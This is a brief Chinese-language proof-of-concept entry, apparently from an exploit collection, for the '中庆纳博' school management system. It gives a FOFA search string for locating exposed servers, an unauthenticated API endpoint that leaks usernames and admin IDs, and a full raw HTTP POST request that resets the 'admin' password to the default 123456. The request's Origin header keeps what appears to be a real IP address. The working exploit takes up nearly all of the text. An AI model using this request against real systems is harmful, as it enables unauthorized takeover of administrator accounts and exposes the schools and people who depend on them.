<languages />

FOFA
----

    "中庆纳博"

POC
---

訪問此鏈接，可以看見洩露用戶名，以及管理id。然後可以通過 用戶名重置密碼為默認密碼123456

    http://xxxxxx/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords

    POST /api/User/ResetPassword HTTP/1.1
    Host: xxxxxxxxxx
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
    Accept: application/json, text/plain, /
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json;charset=utf-8
    Content-Length: 23
    Origin: http://117.36.154.34:8010
    DNT: 1
    Connection: close
    Referer: http://xxxxxxxx/default/admin/user/index{"loginName":"admin"}